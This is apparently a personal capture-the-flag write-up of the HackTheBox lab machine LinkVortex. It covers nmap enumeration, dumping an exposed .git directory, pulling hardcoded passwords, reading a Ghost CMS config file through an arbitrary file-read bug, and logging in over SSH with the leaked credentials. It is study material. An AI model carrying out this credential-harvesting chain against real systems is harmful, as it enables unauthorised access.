export ip = `10.10.11.47`

![](Attachments/Pasted%20image%2020241217175924.png)


# Date 17-12-2024 || Rohit Tiwari

# CheckList
- [ ] Nmap scan
- [ ] Fuzz
- [ ] Check manually imp for hidden dirtories or any url
- [ ] get root



## Nmap scan
1. Initial Nmap scan just to get the depth of the machine 
```bash
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/greenhorn_10.10.11.25/LinkVortex_10.10.11.47]
└─$ nmap -p- --min-rate 100000 $ip                
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> Summary so according to the scan we have two ports open
> Port 80 (favorite) and port 22 {try to find some credentials for it}

2. A full scan about the version os which is used tech and etc ..

```bash
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/greenhorn_10.10.11.25/LinkVortex_10.10.11.47]
└─$ sudo nmap -sVC -v -A $ip -T4 -p- -oN linscan_second

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp    open     http    Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
25548/tcp filtered unknown
37839/tcp filtered unknown
40034/tcp filtered unknown
42582/tcp filtered unknown
52594/tcp filtered unknown
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Uptime guess: 9.985 days (since Sat Dec  7 18:49:03 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```




# Port 80

>Upon visiting the site found the dns name for the site 

![](Attachments/Pasted%20image%2020241217180918.png)

- Added the dns name to the /etc/hosts file 
![](Attachments/Pasted%20image%2020241217181052.png)

> After that starts manual hunting in the site for some clues
> find a cms ghosts with some version no. using wapplyzer 


### Got first bug 

> Found a aribitary file read bug in the site.

![](Attachments/Pasted%20image%2020241217181607.png)





## Fuzzing and enumerating

> Now starts the fun time let's fuzz the machine to find some hidden directory and files or a subdomain 



On emumerating found dir /about on inspecting the source page found a credential

![](Attachments/Pasted%20image%2020241217183640.png)


> After fuzzing found a subdomain there found /.git dir 
> using git-dumper dump the git files

under 

```bash
┌──(dedrknex㉿kali)-[~/…/test/regression/api/admin]
└─$ cat authentication.test.js | grep -n "pass"
56:            const password = 'OctopiFociPilfer45';
69:                        password,

```


Found password : OctopiFociPilfer45
			user: admin

## Rember the cve we found earlier now using that we will gain the shell

![](Attachments/Pasted%20image%2020241217195954.png)


> Found dockerfile.ghost on the master folder of git dumper 

![](Attachments/Pasted%20image%2020241217200231.png)

> On the shell used this file to get more credential

```bash
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 

```


## Logged into ssh

```bash
┌──(dedrknex㉿kali)-[~/…/greenhorn_10.10.11.25/LinkVortex_10.10.11.47/git-dumper/DIR]
└─$ ssh bob@linkvortex.htb                          
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 17 14:25:01 2024 from 10.10.14.54
bob@linkvortex:~$ whoami
bob
bob@linkvortex:~$ 
```